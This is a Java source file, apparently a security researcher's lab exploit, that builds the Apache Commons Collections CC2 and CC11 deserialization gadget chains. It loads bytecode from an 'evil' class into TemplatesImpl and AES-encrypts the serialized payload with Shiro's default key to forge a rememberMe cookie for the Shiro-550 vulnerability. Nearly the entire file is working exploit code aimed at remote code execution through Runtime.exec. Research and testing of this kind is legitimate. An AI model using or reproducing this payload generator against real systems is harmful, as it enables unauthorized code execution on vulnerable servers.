


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.InvokerTransformer;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import util.SerializeUtil;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.*;

/**
 * cc2的测试环境
 * jdk7
 * cc版本4.0
 *
 * **/
public class vuln_shiro550 {
    public static void main(String[] args) throws Exception {
        AesCipherService aesCipherService = new AesCipherService();
        byte[] getpayload = getpayloadcc11();
        ByteSource encrypt = aesCipherService.encrypt(getpayload,Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA=="));
        System.out.println(encrypt.toString());

    }

    /**
     * 调用链
     * ObjectInputStream.readObject()
     * PriorityQueue.readObject()
     * PriorityQueue.heapify()
     * PriorityQueue.siftDown()
     * PriorityQueue.siftDownUsingComparator()
     * TransformingComparator.compare()
     * ChainedTransformer.transform()
     * ...
     * Runtime.exec()
     * **/
    public static byte[] getpayloadcc2() throws IOException, CannotCompileException, NotFoundException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add(1);
        priorityQueue.add(1);
        //获取恶意类的字节码
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("util.Evil");
        byte[] evilPayload = ctClass.toBytecode();
        //设置恶意字节码到TemplatesImpl中
        TemplatesImpl templates = new TemplatesImpl();
        SerializeUtil.setFieldValue(templates,"_name","v1f18");
//        SerializeUtil.setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        SerializeUtil.setFieldValue(templates,"_bytecodes",new byte[][]{evilPayload});
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer",null,null);
        TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);
        SerializeUtil.setFieldValue(priorityQueue,"comparator",transformingComparator);

        Field queue = priorityQueue.getClass().getDeclaredField("queue");
        queue.setAccessible(true);
        Object[] o = (Object[]) queue.get(priorityQueue);
        o[0] = templates;
        return SerializeUtil.writeObjectToByteArray(priorityQueue).toByteArray();

    }


    public static byte[] getpayloadcc11() throws  Exception{
        CtClass evil_payload = ClassPool.getDefault().get("util.evil");
        TemplatesImpl templates = new TemplatesImpl();
        SerializeUtil.setFieldValue(templates,"_name","v1f18");
        SerializeUtil.setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        SerializeUtil.setFieldValue(templates,"_bytecodes",new byte[][]{evil_payload.toBytecode()});
        InvokerTransformer invokerTransformer = new InvokerTransformer("abc", null, null);

        Map decorate = LazyMap.decorate(new HashMap(), (Transformer) invokerTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, templates);
        HashSet hashSet = new HashSet();
        hashSet.add(1);
        Field f,f2 ;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        //hashset实际上使用hashmap来存储,hashsetMap就是hashmap类
        HashMap hashsetMap = (HashMap) f.get(hashSet);

        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }
        f2.setAccessible(true);
        Object[] array = (Object[])f2.get(hashsetMap);
        Object node = array[0];
        if (node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node,tiedMapEntry);

        SerializeUtil.setFieldValue(invokerTransformer,"iMethodName","newTransformer");

        return SerializeUtil.writeObjectToByteArray(hashSet).toByteArray();


    }

}
